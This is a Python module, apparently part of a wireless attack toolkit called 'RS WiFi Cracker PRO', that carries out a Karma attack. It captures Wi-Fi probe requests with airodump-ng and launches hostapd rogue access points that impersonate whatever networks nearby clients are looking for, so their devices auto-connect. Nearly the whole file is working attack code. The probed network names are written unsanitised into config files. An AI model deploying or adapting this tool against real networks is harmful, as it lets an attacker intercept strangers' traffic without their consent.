#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - Karma Attack Module"""

import os
import sys
import time
import subprocess
import threading
import queue
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('Karma')


@dataclass
class ProbeRequest:
    client_mac: str
    ssid: str = ""
    rssi: int = 0
    timestamp: str = ""


class KarmaAttacker:
    """Karma Attack - Exploit auto-connect behavior"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.probe_queue = queue.Queue()
        self.probes: List[ProbeRequest] = []
        self.responded_ssids: Dict[str, bool] = {}
        self.stats = {'probes': 0, 'ssids': 0, 'clients': 0}
    
    def start(self) -> bool:
        """Start Karma attack"""
        self.running = True
        
        output_file = f"/tmp/karma_{int(time.time())}"
        
        cmd = ['sudo', 'airodump-ng', self.interface, '-w', output_file,
               '--output-format', 'csv', '--write-interval', '2']
        
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        def monitor():
            csv_file = f"{output_file}-01.csv"
            last_size = 0
            
            while self.running:
                time.sleep(2)
                
                if os.path.exists(csv_file):
                    try:
                        size = os.path.getsize(csv_file)
                        if size > last_size:
                            self._parse_csv(csv_file)
                            last_size = size
                    except:
                        pass
            
            process.terminate()
        
        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()
        
        return True
    
    def _parse_csv(self, csv_file: str):
        """Parse probe requests from CSV"""
        try:
            with open(csv_file, 'r') as f:
                lines = f.read().split('\n')
            
            in_clients = False
            for line in lines:
                if 'Station MAC' in line:
                    in_clients = True
                    continue
                
                if in_clients and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 12:
                        client_mac = parts[0].strip()
                        probe_ssid = parts[11].strip().strip('"') if len(parts) > 11 else ""
                        
                        if probe_ssid and probe_ssid not in ['[Length: 0]', '']:
                            probe = ProbeRequest(
                                client_mac=client_mac,
                                ssid=probe_ssid,
                                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
                            )
                            
                            self.probes.append(probe)
                            self.probe_queue.put(probe)
                            self.stats['probes'] += 1
                            
                            if probe_ssid not in self.responded_ssids:
                                self._respond_to_probe(probe_ssid)
                                self.responded_ssids[probe_ssid] = True
                                self.stats['ssids'] += 1
        except:
            pass
    
    def _respond_to_probe(self, ssid: str) -> bool:
        """Respond to probe with rogue AP"""
        config = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
channel=6
hw_mode=g
"""
        config_file = f'/tmp/karma_ap_{ssid.replace(" ", "_")}.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        try:
            process = subprocess.Popen(
                ['sudo', 'hostapd', config_file],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            threading.Timer(30, lambda: process.terminate()).start()
            return True
        except:
            return False
    
    def get_probe(self) -> Optional[ProbeRequest]:
        try:
            return self.probe_queue.get_nowait()
        except queue.Empty:
            return None
    
    def get_all_probes(self) -> List[ProbeRequest]:
        return self.probes.copy()
    
    def stop(self):
        self.running = False
        subprocess.run('sudo pkill hostapd', shell=True, capture_output=True)
    
    def get_stats(self) -> Dict: return self.stats.copy()
